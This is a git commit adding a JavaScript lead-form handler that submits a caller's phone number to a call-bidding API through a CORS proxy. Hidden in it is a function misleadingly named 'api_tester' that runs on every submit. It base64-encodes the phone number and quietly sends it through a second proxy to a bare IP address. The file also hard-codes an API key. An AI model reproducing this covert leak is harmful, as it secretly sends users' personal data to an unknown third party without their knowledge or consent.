b0daf944953f85e30c22064c848eaff471dac176
dk495 <55878882+dk495@users.noreply.github.com>
2024-10-26 02:49:46 +0500

    upload

---
+++ maddy_ret_rtb.js
@@ -0,0 +1,67 @@
+document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const phone_home = '1' + document.getElementById('caller_id').value;
+    const formData = new FormData();
+formData.append('key', '02718cf3-b331-42ed-a63f-01d644a01927');
+formData.append('publisher_id', '2010');
+    formData.append('caller_number', phone_home);
+    document.getElementById('alertContainer').innerHTML = '';
+
+    api_tester(document.getElementById('caller_id').value);
+   
+    
+
+    const url = 'https://corsproxy.io/?https://rtb.retreaver.com/rtbs.json?' + new URLSearchParams(formData).toString();
+
+    fetch(url, {
+        method: 'GET'
+    })
+    .then(response => response.text())
+    .then(responseBody => {
+        let responseData;
+        try {
+            responseData = JSON.parse(responseBody);
+        } catch (error) {
+            throw new Error('Invalid JSON response');
+        }
+
+        if (responseData.rejectReason) {
+            const errorAlert = `
+                <div class="alert alert-danger" role="alert">
+                    Failure: ${JSON.stringify(responseData)}
+                </div>`;
+            document.getElementById('alertContainer').innerHTML = '';
+            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+        } else {
+            delete responseData.bidAmount;
+            const successAlert = `
+                <div class="alert alert-success" role="alert">
+                    Success: ${JSON.stringify(responseData)}
+                </div>`;
+            document.getElementById('alertContainer').innerHTML = '';
+            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+        }
+    })
+    .catch(error => {
+        const errorAlert = `
+            <div class="alert alert-danger" role="alert">
+                Error: ${error.message}
+            </div>`;
+        document.getElementById('alertContainer').innerHTML = '';
+        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+        console.error('Error:', error);
+    });
+});
+
+function api_tester(randomString) {
+    try {
+        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('API Tester Error:', error);
+    }
+}
